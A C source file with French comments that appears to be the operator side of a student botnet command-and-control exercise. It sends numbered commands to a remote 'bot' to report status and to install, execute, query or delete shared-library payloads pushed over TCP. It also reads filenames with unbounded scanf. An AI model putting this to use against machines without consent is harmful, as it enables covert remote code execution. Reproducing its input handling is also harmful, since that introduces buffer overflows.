#include "protocole.h"

/**
 * void send_file_tcp(void *s)
 * Fonction qui envoie la charge de travail dans la socket TCP puis la ferme à la fin 
 * 
 * param pointeur vers la socket TCP
 * 
 */
void send_file_tcp(void *s, char *filename)
{ 
    
    int socket_tcp = *((int *)s);
    int sent_bytes = 0;
    char file_size[256];
    struct stat file_stat;
    int fd;
    off_t offset;
    int remain_data;

    //Read file
    //fd = open("example.so", O_RDONLY);
    fd = open(filename, O_RDONLY);
    if (fd == -1)
    {
        perror("Error IN Opening File .. \n");
        return;
    }
    //Récupère la taille du fichier à envoyer
    if (fstat(fd, &file_stat) < 0)
    {
        perror("Bla");
        exit(EXIT_FAILURE);
    }

    //Sending file name de la charge utile
    if (send(socket_tcp, filename, TAILLE_FILENAME, 0) < 0)
    {
        perror("Error on sending file size");
        exit(EXIT_FAILURE);
    }

    sprintf(file_size, "%ld", file_stat.st_size);
    /* Sending file size */
    if (send(socket_tcp, file_size, sizeof(file_size), 0) < 0)
    {
        perror("Error on sending file size");
        exit(EXIT_FAILURE);
    }
    printf("Sent file Size: %s bytes\n", file_size);

    offset = 0;
    remain_data = file_stat.st_size;
    /* Sending file data */
    /* Envoie le fichier en plusieurs fois : https://stackoverflow.com/questions/11952898/c-send-and-receive-file */
    while (((sent_bytes = sendfile(socket_tcp, fd, &offset, BUFSIZ)) > 0) && (remain_data > 0))
    {
        printf("1. Sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
        remain_data -= sent_bytes;
        printf("2. Sent sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data);
    }
    printf("All file has been sended\n");
    // Test : Que se passe-t-il si on attend un certain moment avant de close la socket ?
    close(fd); // close the file
    // printf("File Sent successfully !!! \n");
    close(socket_tcp);
}

/**
 * void send_commad_tcp(void *s, char num)
 * Fonction qui récupère une socket_tcp et un numéro de commande sous forme de char(pour optimiser)
 * selon le numéro de commande elle envoie un ordre sous forme de chaine de caractère au bot
 * selon l'ordre qu'il recevra il agira en conséquence sur la charge utile
 * apres lui avoir envoyée la commande à faire elle appelle la fct qui envoie la charge utile
 * 
 * param pointeur vers la socket TCP
 */

void send_commad_tcp(void *s)
{
    int socket_tcp = *((int *)s);
    char num;
    char filename[TAILLE_FILENAME];
    char msg_recu[TAILLE_MSG_PROTOCOLE];
    printf("Donnez un numéro de commande (entre 1 et 5): \n");
    //TODO : Retirer les scanf
    scanf("%c", &num);
    switch (num)
    {
    case '1': //Demande d'envoyer le statut du bot
        printf("Demande d'avoir le 'status' d'un bot\n");
        write(socket_tcp, &num, sizeof(char));
        if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
        {
            printf("Erreur dans la réception du msg_recu \n");
            exit(1);
        }
        printf(" Le bot m'a répondu que son status est : %s\n", msg_recu);
        break;
    case '2': //Demande d'installation puis l'envoie du fichier à envoyer
        printf("Demande d'installation' d'un fichier\n");
        write(socket_tcp, &num, sizeof(char));
        printf("Quel fichier voulez-vous envoyer:example.so? example1.so ? ou example2.so\n");
        scanf("%s", filename);
        //strcpy(filename, tem);
        write(socket_tcp, filename, TAILLE_FILENAME);
        send_file_tcp((void *)&socket_tcp, filename);
        break;

    case '3': //Demande d'exécuter le fichier
        printf("Demande d'exec d'un fichier\n");
        write(socket_tcp, &num, sizeof(char));
        printf("Quel fichier voulez-vous executer:example.so? example1.so ? ou example2.so\n");
        scanf("%s", filename);
        write(socket_tcp, filename, TAILLE_FILENAME);
        break;
    case '4': //Demande de donner le résultat de l'exec
        printf("Demande d'avoir le resultat d'exec d'un fichier\n");
        write(socket_tcp, &num, sizeof(char));
        printf("Vous souhaitez le résultat d'exec de quel fichier ? : example.so? example1.so ? ou example2.so\n");
        scanf("%s", filename);
        write(socket_tcp, filename, TAILLE_FILENAME);
        if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
        {
            printf("Erreur dans la réception du msg_recu \n");
            exit(1);
        }
        printf(" Le bot m'a répondu que le résultat de son exéc est : %s\n", msg_recu);
        break;
    case '5': // Demande de supprimer
        printf("Demande de suppression d'un fichier\n");
        write(socket_tcp, &num, sizeof(char));
        printf("Quel fichier voulez-vous supprimer :example.so? example1.so ? ou example2.so\n");
        scanf("%s", filename);
        write(socket_tcp, filename, TAILLE_FILENAME);
        break;
    case '6': //Demande de quitter la connexion
        printf("Demande de quitter la connexion\n");
        write(socket_tcp, &num, sizeof(char));
        break;
    default:
        printf("Erreur\n");
        exit(-1);
    }
}
